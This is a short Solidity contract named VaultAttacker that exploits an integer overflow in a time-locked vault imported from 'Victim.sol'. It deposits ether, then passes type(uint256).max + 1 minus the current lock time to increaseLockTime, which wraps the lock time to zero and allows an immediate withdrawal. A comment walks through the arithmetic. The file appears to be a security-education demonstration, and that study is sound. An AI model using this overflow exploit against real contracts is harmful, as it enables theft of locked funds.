// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "./Victim.sol";

contract VaultAttacker {
    Vault vault;

    constructor(address _vault) {
        vault = Vault(_vault);
    }

    fallback() external payable {}

    function Attack() public payable {
        vault.deposit{value: msg.value}();
        /*
        if t = current lock time then we need to find x such that
        x + t = 2**256 = 0
        so x = -t
        2**256 = type(uint).max + 1
        so x = type(uint).max + 1 - t
        */
        vault.increaseLockTime(type(uint256).max + 1 - vault.lockTime(address(this)));
        vault.withdraw();
    }
}
